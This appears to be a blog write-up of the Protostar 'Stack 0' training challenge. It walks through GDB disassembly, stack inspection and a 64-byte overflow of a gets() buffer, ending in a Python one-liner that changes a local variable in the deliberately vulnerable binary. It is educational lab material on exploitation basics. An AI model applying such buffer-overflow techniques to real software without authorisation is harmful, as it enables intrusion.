---
layout: post
title: "B2B - Protostar, Stack0 (x86)"
---

## Introduction:

B2B is a series I have forced upon myself to make sure my basics are covered when it comes to exploitation. After passing my OSCE, I took a little break from exploitation to focus on a few work aspects, but now I am hungry for more lower level nonsense. 

This series will focus mainly on exploitation challenges which cover various techniques. First of which, is the stack overflow challenges within the Protostar image from "exploit education" found <a href="https://exploit.education/protostar/">here</a>. I gave myself two main rules to stick to whilst working through all these challenges.

1) Don't read the C source code for each challenge, only the hints section if required

2) Don't read other peoples write ups for these challenges unless I have already finished it and want to see other routes to further my interest

## Stack 0

The first challenge of Protostar is "Stack 0". I approached each challenge with a similar set of steps, so each post will likely follow a similar template(ish). Including initial running, inspecting the disassembly of the binary and some other specific steps in between before finally crafting a payload and owning the process.

Our initial use of the program identified the following:

```
$ ./stack0
test
Try again?
```

The program simply appears to take input as it's first action, presumably does something with it in the background and then prints some output based on the value that was specified. In this case, the binary took the word 'test' as input, and printed 'Try again?'.

We can dig deeper by inspecting the compiled code with GDB. As mentioned before, I won't be using the C source code on the website during this process so I will attempt to reverse and piece together the program from the disassembled code. If you, the reader, haven't used GDB before - I just want to warn you that I won't really be discussing how I am using GDB other than the output I add to these posts. I'm not a ninja with the debugger, however I know enough about it to get some basic stuff done so you should be able to follow along and research further when and where you need it.

That being said, I loaded stack0 up in gdb and disassembled the "main" function to see what was going on:

```assembly
(gdb) disas main
Dump of assembler code for function main:
0x080483f4 <main+0>:	push   ebp
0x080483f5 <main+1>:	mov    ebp,esp
0x080483f7 <main+3>:	and    esp,0xfffffff0
0x080483fa <main+6>:	sub    esp,0x60
0x080483fd <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:	lea    eax,[esp+0x1c]
0x08048409 <main+21>:	mov    DWORD PTR [esp],eax
0x0804840c <main+24>:	call   0x804830c <gets@plt>
0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:	test   eax,eax
0x08048417 <main+35>:	je     0x8048427 <main+51>
0x08048419 <main+37>:	mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:	call   0x804832c <puts@plt>
0x08048425 <main+49>:	jmp    0x8048433 <main+63>
0x08048427 <main+51>:	mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:	call   0x804832c <puts@plt>
0x08048433 <main+63>:	leave  
0x08048434 <main+64>:	ret    
End of assembler dump.
```

Breaking the above down into a list of "pseudo" type instructions, our programs flow appears to be the following:

- Grow the stack by 0x60 bytes
- Move 0x0 into esp+0x5c (some sort of flag?)
- gets is called to take input from user <- gets() is a function vulnerable to buffer overflows
- value from esp+0x5c is moved  into EAX
- eax is checked to see if 0 (assumptions of our flag above was correct)
- if it is 0, we jump and write something
- if it isn't 0, we carry on and write something else

From this, we can assume that the 'win' condition requires the value set to esp+0x5c to be changed from the hard-coded value of 0. We can inspect this further by placing a breakpoint on the instructions that check this value before deciding on the win/lose condition:

```
b *main+29
```

Upon hitting this breakpoint, we inspect the registers to see what is happening for each of these instructions:

```
(gdb) i r
eax            0xbffffc5c	-1073742756
ecx            0xbffffc5c	-1073742756
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc40	0xbffffc40
ebp            0xbffffca8	0xbffffca8
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+29>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) ni
0x08048415	13	in stack0/stack0.c
(gdb) i r
eax            0x0	0
ecx            0xbffffc5c	-1073742756
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc40	0xbffffc40
ebp            0xbffffca8	0xbffffca8
esi            0x0	0
edi            0x0	0
eip            0x8048415	0x8048415 <main+33>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

As we can see above, the value located at esp+0x5c is loaded into the EAX register, ready for the comparison. At this point, we see that EAX is equal to 0, which is the value defined earlier on in the program.

We step over the instruction that performed the comparison with the EAX value and the value 0 allowing us to examine the win/lose condition check:

```
(gdb) i r
eax            0x0	0
ecx            0xbffffc5c	-1073742756
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffc40	0xbffffc40
ebp            0xbffffca8	0xbffffca8
esi            0x0	0
edi            0x0	0
eip            0x8048417	0x8048417 <main+35>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

At this point, our EIP is pointing to the following instruction:

```
0x08048417 <main+35>:	je     0x8048427 <main+51>
```

As our EAX does equal 0, we jump to the target instruction which lies at "main+51", which outputs our 'fail' condition:

```
(gdb) ni
0x0804842e	16	in stack0/stack0.c
(gdb) 
Try again?
```

Although we technically failed the program, we can now see the target value we must overwrite in order to change the outcome of this comparison check and make sure we don't take the jump. Logic dictates, that if the jump was taken when our EAX was equal to 0, we need to make sure the EAX equals anything but 0 for us not to take the jump.

As we know there should be a buffer overflow due to the usage of the gets() function, we want to see the layout of our memory to see whether or not we can gain control of this value at esp+0x5c. To do this, we can place place a breakpoint on our gets() function (or just after it) and run our program.

We can then use the logic of the program to check this value before and after the value is set:

```
(gdb) x/wx $esp+0x5c
0xbffffc9c:	0xb7fd7ff4
(gdb) ni
11	in stack0/stack0.c
(gdb) x/wx $esp+0x5c
0xbffffc9c:	0x00000000
```

As we see above, the address "0xbffffc9c" is where our 'flag' is stored and it holds the value of 0. 

Now we know the location of this value of the stack, we want to track where our defined input is being stored to see if overflowing the target buffer could affect this target. Place a breakpoint just after the gets() function and examine the stack:

```
(gdb) x/60wx $esp
0xbffffc40:	0xbffffc5c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffffc50:	0xb7fd7ff4	0xb7ec6165	0xbffffc68	0x41414141 <--- start of input AAAA
0xbffffc60:	0x42424242	0x08049600	0xbffffc78	0x080482e8
0xbffffc70:	0xb7ff1040	0x08049620	0xbffffca8	0x08048469
0xbffffc80:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffffca8
0xbffffc90:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000 <--- Our 0x0 flag
0xbffffca0:	0x08048450	0x00000000	0xbffffd28	0xb7eadc76
0xbffffcb0:	0x00000001	0xbffffd54	0xbffffd5c	0xb7fe1848
0xbffffcc0:	0xbffffd10	0xffffffff	0xb7ffeff4	0x0804824b
0xbffffcd0:	0x00000001	0xbffffd10	0xb7ff0626	0xb7fffab0
0xbffffce0:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
0xbffffcf0:	0xbffffd28	0xb463ad27	0x9e22bb37	0x00000000
0xbffffd00:	0x00000000	0x00000000	0x00000001	0x08048340
0xbffffd10:	0x00000000	0xb7ff6210	0xb7eadb9b	0xb7ffeff4
0xbffffd20:	0x00000001	0x08048340	0x00000000	0x08048361
```

As we can see above, my input was "AAAABBBB" and can be seen starting at the address "0xbffffc5c" and continuing for 8 bytes dictated by the "41414141 42424242". If we continue down (actually, up) the stack we see our 'flag' the target address of "0xbffffc9c". As this is further down (up) the stack than our controllable buffer contents, we should be able to overflow the buffer and overwrite the flag's value.

The different of these addresses can be calculated by getting the difference between the two values. We get the decimal value of 64. This dictates how many bytes we need to write into our buffer to eventually control the value of our flag. To test this, I wrote enough 'A' characters to reach the flag and then replace the value with 4  'B' characters:

```
(gdb) x/60wx $esp
0xbffffc40:	0xbffffc5c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffffc50:	0xb7fd7ff4	0xb7ec6165	0xbffffc68	0x41414141
0xbffffc60:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc70:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc80:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc90:	0x41414141	0x41414141	0x41414141	0x42424242 <--- Our flag
0xbffffca0:	0x08048400	0x00000000	0xbffffd28	0xb7eadc76
0xbffffcb0:	0x00000001	0xbffffd54	0xbffffd5c	0xb7fe1848
0xbffffcc0:	0xbffffd10	0xffffffff	0xb7ffeff4	0x0804824b
```

Continuing to step through our program, we can see the 'wanted' functionality and output of the program:

```
(gdb) ni
0x08048415	13	in stack0/stack0.c
(gdb) 
0x08048417	13	in stack0/stack0.c
(gdb) 
14	in stack0/stack0.c
(gdb) 
0x08048420	14	in stack0/stack0.c
(gdb) 
you have changed the 'modified' variable   <--- win condition!
```

In order to check our payload is correct and we have the correct offset, we run the following command outside of GDB to see if everything is correct. Our payload is:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

This can be completed with the following one-liner:

```
$ python -c 'print "A"*64 + "B"*4' | ./stack0
you have changed the 'modified' variable
```

Winner! We successfully changed the target variable, located at esp+0x5c making sure we didn't jump at our condition and flowed into the correct section of the program.